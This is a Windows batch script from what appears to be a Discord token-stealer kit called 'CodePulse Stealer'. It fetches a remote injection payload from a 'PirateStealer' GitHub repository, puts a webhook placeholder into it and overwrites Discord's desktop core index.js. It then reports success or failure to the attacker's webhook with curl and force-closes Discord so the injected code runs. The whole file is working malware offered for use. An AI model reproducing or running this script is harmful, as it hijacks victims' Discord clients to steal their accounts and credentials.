@echo off
setlocal

set "webhook_url=REPLACEMEWITHYOURWEBHOOK"

set "discord_directory=C:\Users\%Username%\AppData\Local\Discord\app-1.0.9013\modules\discord_desktop_core-1\discord_desktop_core"

powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/6R-r/PirateStealer/main/src/injection/injection-clean.js' -OutFile 'temp.js'; (Get-Content 'temp.js') -replace '%%WEBHOOK%%', '%webhook_url%' | Set-Content '%discord_directory%\index.js'; Remove-Item 'temp.js'"

if exist "%discord_directory%\index.js" (
    echo Discord injection completed successfully.
    curl -X POST -H "Content-Type: application/json" -d "{\"embeds\":[{\"title\":\"Discord Injection - CodePulse Stealer\",\"color\":3447704,\"fields\":[{\"name\":\"Injection Status\",\"value\":\"Discord injection completed successfully.\",\"inline\":false}]}]}" %webhook_url%
) else (
    echo Discord injection failed.
    curl -X POST -H "Content-Type: application/json" -d "{\"embeds\":[{\"title\":\"Discord Injection - CodePulse Stealer\",\"color\":3447704,\"fields\":[{\"name\":\"Injection Status\",\"value\":\"Discord injection failed.\",\"inline\":false}]}]}" %webhook_url%
)

powershell -Command "function Stop-Discord { $discordProcesses = Get-Process -Name 'Discord' -ErrorAction SilentlyContinue; foreach ($process in $discordProcesses) { $process | Stop-Process -Force } }; Stop-Discord"

::i wont comment this cuz its yk
pause
